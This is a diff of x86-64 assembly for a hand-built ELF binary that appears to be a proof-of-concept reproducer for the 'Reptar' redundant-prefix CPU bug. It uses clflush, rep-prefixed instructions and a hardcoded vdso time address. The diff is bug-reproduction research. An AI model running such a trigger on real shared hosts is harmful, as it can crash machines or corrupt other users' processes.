@@ -33,18 +33,21 @@ text_phdr:                                      ; Elf64_Phdr
 phdrsize    equ     $ - text_phdr
 
 _start:
-    mov cl, 7
+    mov rdx, .end_of_program
+    times 10 push rdx
     lea rax, [rsp - 0x1000]
     lea r8, [.after_reptar - .loop_only_on_bug]
-    mov r10, 0x00007ffff7ffde40 ; after time
-    xor rbx, rbx
-    mov rdx, .end_of_program
+    mov r10, 0x00007ffff7ffda40 ; after time
     mov r11, .loop_only_on_bug
-    push rdx
     xor rdx, rdx
+    xor rbx, rbx
+    xor r12, r12
+    mov r13, 0x13371337
     .loop_for_every_iteration:
-        jmp .loop_only_on_bug
+        jmp r11
         .loop_only_on_bug:
+            nop
+            nop
             clflush [rax]
             clflush [rax+64]
             mov rsi, rax
@@ -52,11 +55,19 @@ _start:
             mov cl, 1
             inc rdx
             mov r9, rdx
-            sub r9, rbx
+            sub r9, r12
             imul r9, r8
             add r9, r11
-            cmp r9, r10 ; we are past vdso
-            jae 0x00007ffff7ffde10 ; time
+            xor rbx, rbx
+            cmp r9, r10
+            setae bl
+            imul rbx, 0x4000
+            neg rbx
+            add rbx, rsp
+            nop
+            mov qword [rbx], r13
+            mov qword [rsp], r11
+            ;jae 0x00007ffff7ffda40 ; time
 
             .reptar:
                 rep
@@ -72,10 +83,11 @@ _start:
                 nop
                 nop
             .after_reptar_alias:
-                times 100 int3
+                times 100 nop
+                int3
 
             .skip_reptar_alias:
-                inc rbx
+                inc r12
                 jmp .loop_for_every_iteration
             .end_of_program:
                 int3
